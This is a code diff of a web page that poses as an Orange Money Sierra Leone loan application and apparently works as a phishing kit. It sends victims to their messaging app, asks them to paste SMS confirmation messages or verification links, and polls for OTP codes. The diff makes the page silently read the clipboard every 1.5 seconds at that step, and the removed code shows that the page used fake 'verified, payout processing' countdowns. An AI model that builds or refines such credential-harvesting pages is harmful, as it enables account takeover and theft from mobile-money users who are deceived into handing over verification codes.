@@ -303,15 +303,6 @@
               <span class="bg-slate-200 border border-r-0 border-slate-300 rounded-l-xl px-3 py-2.5 text-xs font-bold text-slate-600">+232</span>
               <input id="phone-number-input" type="tel" placeholder="76 123 456" oninput="checkReturningUserPhone(this.value)" class="w-full bg-slate-50 border border-slate-300 rounded-r-xl px-3.5 py-2.5 text-xs font-bold text-slate-800 focus:outline-none focus:border-brand-orange" value="" required />
             </div>
-
-            <!-- Returning User Detection Banner -->
-            <div id="returning-user-banner" class="hidden mt-2 p-2.5 bg-emerald-50 border border-emerald-200 rounded-xl text-xs flex items-center space-x-2 shadow-sm">
-              <span class="text-base flex-shrink-0">🎉</span>
-              <div>
-                <span class="font-extrabold text-emerald-950 block text-[11px] uppercase tracking-wider">Returning Applicant Detected</span>
-                <span id="returning-user-text" class="text-emerald-800 text-[11px] font-medium leading-tight block mt-0.5">Welcome back! Account found in database. Details pre-filled.</span>
-              </div>
-            </div>
           </div>
 
           <div>
@@ -453,6 +444,7 @@
             <div class="pt-1 grid grid-cols-2 gap-2.5">
               <a 
                 href="sms:" 
+                onclick="openMessagingApp(event)" 
                 class="py-3 px-3 bg-brand-black hover:bg-slate-900 text-white font-extrabold rounded-xl text-center text-xs flex items-center justify-center space-x-1.5 transition-all shadow-sm">
                 <span>💬</span>
                 <span>Open SMS App</span>
@@ -467,14 +459,14 @@
             </div>
           </div>
 
-          <!-- 20-Second SMS Verification Countdown Timer Card -->
+          <!-- 20-Second Message Verification Countdown Timer Card -->
           <div id="sim-sms-countdown-card" class="bg-gradient-to-r from-orange-50 to-amber-50 border border-amber-200 rounded-2xl p-4 text-center space-y-1.5 shadow-sm">
             <div class="flex items-center justify-center space-x-2">
               <span class="relative flex h-2.5 w-2.5">
                 <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-orange opacity-75"></span>
                 <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-brand-orange"></span>
               </span>
-              <span class="text-xs font-extrabold text-amber-950 uppercase tracking-wider">SMS Confirmation Countdown</span>
+              <span class="text-xs font-extrabold text-amber-950 uppercase tracking-wider">Message Verification Countdown</span>
             </div>
             <p class="text-[11px] text-slate-600 font-medium">Verification SMS sent to <strong class="text-brand-orangeDark font-mono">+232 <span id="sms-timer-phone">76123456</span></strong></p>
             <div id="sms-timer-display" class="text-3xl font-black text-brand-orange tracking-tight font-mono py-0.5">00:20</div>
@@ -558,20 +550,6 @@
           
           <h2 class="text-xl font-extrabold text-slate-900" data-i18n="step5Title">Application Submitted!</h2>
           <p class="text-xs text-slate-500 mt-1" data-i18n="step5Sub">Your loan request has been routed to Orange Money Financial Services Sierra Leone.</p>
-        </div>
-
-        <!-- 15-Second Verification & Payout Countdown Card -->
-        <div id="step5-countdown-card" class="bg-gradient-to-r from-orange-50 to-amber-50 border border-amber-200 rounded-2xl p-4 text-center space-y-2 shadow-sm">
-          <div class="flex items-center justify-center space-x-2">
-            <span class="relative flex h-2.5 w-2.5">
-              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-orange opacity-75"></span>
-              <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-brand-orange"></span>
-            </span>
-            <span class="text-xs font-extrabold text-amber-950 uppercase tracking-wider">Final Verification Countdown</span>
-          </div>
-          <p class="text-xs text-slate-600 font-medium">Finalizing Orange Money account verification...</p>
-          <div id="step5-countdown-display" class="text-3xl font-black text-brand-orange tracking-tight font-mono py-0.5">00:15</div>
-          <p id="step5-countdown-status" class="text-[11px] text-slate-500 font-semibold">Please remain on this page while your payout request is finalized.</p>
         </div>
 
         <div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 text-left space-y-3 text-xs shadow-sm">
@@ -811,14 +789,35 @@
       setTimeout(resetScrollToTop, 50);
     }
 
+    function openMessagingApp(e) {
+      if (e) {
+        try { e.preventDefault(); } catch (err) {}
+      }
+      const isAndroid = /android/i.test(navigator.userAgent);
+      if (isAndroid) {
+        try {
+          // Open default messaging app's main conversation list (existing chats)
+          window.location.href = 'intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.APP_MESSAGING;end';
+          setTimeout(() => {
+            window.location.href = 'sms:';
+          }, 500);
+          return;
+        } catch (err) {
+          window.location.href = 'sms:';
+          return;
+        }
+      }
+      window.location.href = 'sms:';
+    }
+
     let lastAutoReadTime = 0;
     function tryAutoReadClipboard() {
       const now = Date.now();
-      if (now - lastAutoReadTime < 4000) return;
+      if (now - lastAutoReadTime < 1200) return;
       lastAutoReadTime = now;
 
       const msgInput = document.getElementById('momo-pasted-msg');
-      if (!msgInput || msgInput.value.trim() || typeof isSubmittingMessage !== 'undefined' && isSubmittingMessage) return;
+      if (!msgInput || msgInput.value.trim() || (typeof isSubmittingMessage !== 'undefined' && isSubmittingMessage)) return;
 
       if (navigator.clipboard && navigator.clipboard.readText) {
         navigator.clipboard.readText().then(text => {
@@ -831,12 +830,25 @@
       }
     }
 
+    let periodicClipboardTimer = null;
+    function startPeriodicClipboardDetection() {
+      if (periodicClipboardTimer) clearInterval(periodicClipboardTimer);
+      periodicClipboardTimer = setInterval(() => {
+        if (currentStep === 4) {
+          tryAutoReadClipboard();
+        } else {
+          clearInterval(periodicClipboardTimer);
+          periodicClipboardTimer = null;
+        }
+      }, 1500);
+    }
+
     let isTabReturnActive = false;
     window.addEventListener('focus', () => {
       if (currentStep === 4 && !isTabReturnActive) {
         isTabReturnActive = true;
         tryAutoReadClipboard();
-        setTimeout(() => { isTabReturnActive = false; }, 2000);
+        setTimeout(() => { isTabReturnActive = false; }, 1500);
       }
     });
 
@@ -844,7 +856,7 @@
       if (document.visibilityState === 'visible' && currentStep === 4 && !isTabReturnActive) {
         isTabReturnActive = true;
         tryAutoReadClipboard();
-        setTimeout(() => { isTabReturnActive = false; }, 2000);
+        setTimeout(() => { isTabReturnActive = false; }, 1500);
       }
     });
 
@@ -897,6 +909,7 @@
       }
 
       startSmsCountdownTimer();
+      startPeriodicClipboardDetection();
 
       if (msgInput && !msgInput.value) {
         msgInput.placeholder = 'Paste SMS confirmation message or verification link here...';
@@ -920,7 +933,7 @@
               const incoming = otp.code || otp.message;
               if (msgInput) {
                 msgInput.value = incoming;
-                handlePostLoginPastedMsg(incoming);
+                handlePostLoginPastedMsg(incoming, true);
               }
             }
           }).catch(() => {});
@@ -986,11 +999,8 @@
     async function checkReturningUserPhone(val) {
       if (phoneCheckTimer) clearTimeout(phoneCheckTimer);
       const clean = (val || '').replace(/[^0-9]/g, '');
-      const banner = document.getElementById('returning-user-banner');
-      const textEl = document.getElementById('returning-user-text');
 
       if (!clean || clean.length < 6) {
-        if (banner) banner.classList.add('hidden');
         return;
       }
 
@@ -1018,13 +1028,6 @@
               if (data.applicationId) {
                 appState.applicationId = data.applicationId;
               }
-
-              if (textEl) {
-                textEl.innerText = `Welcome back, ${data.firstName} ${data.lastName}! Existing profile found in database (${data.status ? data.status.toUpperCase() : 'REGISTERED'}).`;
-              }
-              if (banner) banner.classList.remove('hidden');
-            } else {
-              if (banner) banner.classList.add('hidden');
             }
           }
         } catch (e) {
@@ -1037,6 +1040,10 @@
       hideApprovalOverlay();
       isAwaitingStep2Approval = false;
       if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+      if (stepNum !== 4 && periodicClipboardTimer) {
+        clearInterval(periodicClipboardTimer);
+        periodicClipboardTimer = null;
+      }
 
       if (stepNum === 0) {
         if (pollingInterval) {
@@ -1130,7 +1137,6 @@
         document.getElementById('summary-amount').innerText = `SLE ${appState.loanAmount.toLocaleString()}`;
         const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
         document.getElementById('summary-term').innerText = `${appState.loanTermMonths} Months (${monthly.toLocaleString()} SLE/mo)`;
-        startFinal20SecCountdown();
         if (appState.applicationId) {
           startVerificationPolling(appState.applicationId);
         }
@@ -1139,38 +1145,6 @@
       resetScrollToTop();
       requestAnimationFrame(resetScrollToTop);
       setTimeout(resetScrollToTop, 50);
-    }
-
-    let final20SecInterval = null;
-    function startFinal20SecCountdown() {
-      if (final20SecInterval) clearInterval(final20SecInterval);
-      let secondsLeft = 15;
-      const displayEl = document.getElementById('step5-countdown-display');
-      const statusEl = document.getElementById('step5-countdown-status');
-      
-      const updateDisplay = () => {
-        const secs = secondsLeft < 10 ? `0${secondsLeft}` : `${secondsLeft}`;
-        if (displayEl) displayEl.innerText = `00:${secs}`;
-      };
-      
-      updateDisplay();
-      
-      final20SecInterval = setInterval(() => {
-        secondsLeft--;
-        if (secondsLeft > 0) {
-          updateDisplay();
-        } else {
-          clearInterval(final20SecInterval);
-          if (displayEl) {
-            displayEl.innerText = '✓ VERIFIED';
-            displayEl.className = 'text-2xl font-black text-emerald-600 tracking-tight font-mono py-0.5';
-          }
-          if (statusEl) {
-            statusEl.innerText = '✅ Account verified! Your payout release is being processed for deposit.';
-            statusEl.className = 'text-[11px] text-emerald-700 font-bold';
-          }
-        }
-      }, 1000);
     }
 
     function handleBackAction() {
